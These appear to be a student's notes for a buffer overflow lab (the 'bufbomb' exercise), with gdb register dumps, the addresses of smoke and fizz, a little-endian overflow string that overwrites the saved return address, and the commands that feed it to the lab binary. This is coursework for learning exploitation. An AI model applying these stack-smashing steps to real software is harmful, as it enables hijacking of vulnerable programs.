## call smoke

(gdb) info registers 
eax            0x3                 3
ecx            0xf7f90e1c          -134672868
edx            0x0                 0
ebx            0x0                 0
esp            0xffffbed0          0xffffbed0
ebp            0xffffbee8          0xffffbee8
esi            0x4                 4
edi            0x804b5c0           134526400
eip            0x8048fe6           0x8048fe6 <getbuf+6>
eflags         0x282               [ SF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99

(gdb) p smoke
$1 = {<text variable, no debug info>} 0x8048e20 <smoke>

(gdb) x *(0xffffbee8)
0xffffbf08

(%ebp) = 0xffffbf08
(%ebp+0x4) should be = &smoke

We should consider endian, the overflow hex should be

08bfffff208e0408

./sendstring < smoke.txt > smoke-raw.txt

## call fizz

Team: SA21011038
Cookie: 0x41a21e87

fizz = 08048dc0

 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx

./sendstring < fizz.txt > fizz-raw.txt
./bufbomb -t SA21011038 < fizz-raw.txt 